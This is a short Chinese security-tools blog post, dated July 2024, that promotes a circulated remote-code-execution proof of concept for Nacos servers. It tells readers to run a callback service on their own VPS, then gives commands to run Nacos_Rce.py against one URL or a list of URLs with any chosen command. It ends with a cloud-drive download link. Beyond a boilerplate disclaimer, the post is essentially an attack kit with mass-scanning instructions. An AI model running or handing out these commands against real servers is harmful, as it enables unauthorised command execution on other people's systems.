#  网传nacos_rce漏洞poc（7月15日更新）   
FFR66  Web安全工具库   2024-07-17 22:01  
  
===================================  
免责声明请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。个人微信：ivu123ivu  
0x01 工具介绍  
网传nacos_rce漏洞poc。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3UibsDDs9W5OwpsmUZNHghO7S9YwHYFc9NWeAJJ0yLGqUXx3nA0qIib7yACyjO02GwQ0AHaXpWIbEbMhw/640?wx_fmt=png&from=appmsg "")  
  
0x02 安装与使用  
1. 将config.py和service.py放在自己的vps上并运行  
```
python service.py
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3UibsDDs9W5OwpsmUZNHghO7S9R3WYoXqL1UAOMDyicxFIkc86Nu4oDpSIe1FwYpHicoJmeIjX971QUQ3w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3UibsDDs9W5OwpsmUZNHghO7S9zfbmicHyrqmZOJD8nBOdpZvKysHBC8exKFOx5mrvtJDRq31u3RubdHA/640?wx_fmt=png&from=appmsg "")  
  
2. 单url验证  
```
python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -u http://xxx.xxx.xxx -c whoami
-c whoami 可以不写，默认为whoami,可以自定义命令
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3UibsDDs9W5OwpsmUZNHghO7S9nd5GLG2FiaszHJm9vNOmw5n2YlkE81XiaIr22gHA6YIrlm2aoQgibszOw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3UibsDDs9W5OwpsmUZNHghO7S9v5SVfGJaodupBMSdpBGcmF7sOrlvlVGPopEKOHP9uoKQZTCbwCKPoQ/640?wx_fmt=png&from=appmsg "")  
  
3. 多url验证  
```
python .\Nacos_Rce.py -t vps的ip地址 -p 5000 -f ./url.txt -c whoami
-c whoami 可以不写，默认为whoami,可以自定义命令

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3UibsDDs9W5OwpsmUZNHghO7S9g2tsTBmicjricI7mG5u5YIhOibicV4BYiaFopFicRuhNEgleF64F8KN7hs0w/640?wx_fmt=png&from=appmsg "")  
  
**0x03 项目链接下载**  
  
1、点击阅读原文，从原项目地址下载。  
  
2、网盘下载链接：  
https://pan.quark.cn/s/9b76095dcfa9  
  
  
  
**·****今 日 推 荐**  
**·**  
  
  
